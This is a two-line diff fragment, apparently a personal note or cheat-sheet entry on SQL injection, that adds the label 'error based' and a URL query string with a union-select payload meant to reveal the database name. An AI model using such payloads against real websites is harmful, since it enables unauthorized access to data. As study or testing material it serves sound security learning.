@@ -1,0 +1,2 @@
+error based 
+/?id=0' union select 1,(select database()),1'
